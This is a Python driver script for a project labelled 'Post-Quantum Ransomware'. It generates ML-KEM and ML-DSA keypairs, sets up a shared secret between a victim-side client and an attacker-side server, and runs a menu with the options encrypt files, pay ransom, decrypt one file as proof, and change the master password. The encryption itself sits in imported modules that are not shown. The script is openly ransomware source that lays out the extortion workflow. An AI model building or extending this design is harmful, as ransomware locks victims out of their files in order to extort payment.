from secrets import compare_digest

from pqcrypto.kem.ml_kem_1024 import generate_keypair as generate_kem_keypair
from pqcrypto.sign.ml_dsa_87 import generate_keypair as generate_sign_keypair

from client import Client
from server import Server


def main():
    print("=== Post-Quantum Ransomware ===\n")

    # Generate KEM and signing keypair for server and initialize client and server
    kem_public_key, kem_secret_key = generate_kem_keypair()
    sign_public_key, sign_secret_key = generate_sign_keypair()
    client = Client(kem_public_key, sign_public_key)
    server = Server(kem_secret_key, sign_secret_key)

    # Establish shared secret between client and server
    ciphertext, plaintext_original = client.establish_shared_secret()
    plaintext_recovered = server.establish_shared_secret(ciphertext)

    if compare_digest(plaintext_original, plaintext_recovered):
        print("Shared secret established successfully between client and server.\n")
        client.derive_shared_secret(plaintext_original)
        server.derive_shared_secret(plaintext_original)
    else:
        print("Failed to establish shared secret between client and server.\n")
        return

    while True:

        print("1. Encrypt files")
        print("2. Pay ransom")
        print("3. Decrypt one file")
        print("4. Change master password")

        selection = input("\nSelect an option (1-4): ")

        try:
            if selection == "1":
                client_data = client.encrypt_files()
                server.store_client_passwords(client_data)
                print("The files have been encrypted.\n")
            elif selection == "2":
                server_data, signature = server.send_master_password()
                client.decrypt_files(server_data, signature)
                server.remove_client_passwords()
                print("All files have been decrypted.\n")
            elif selection == "3":
                file_path = input("Enter the path of the file to unlock: ")
                client_data = client.get_file_id(file_path)
                server_data, signature = server.send_password(client_data)
                client.decrypt_file_with_password(file_path, server_data, signature)
                print(f"The file '{file_path}' has been decrypted.\n")
            elif selection == "4":
                client_data = client.get_master_password_metadata()
                server_data, signature = server.change_master_password(client_data)
                client.change_master_password_metadata(server_data, signature)
                print("The master password has been changed.\n")
            else:
                print("Invalid selection. Please choose a valid option.")
        except Exception as e:
            print(f"Error: {e}\n")


if __name__ == "__main__":
    main()
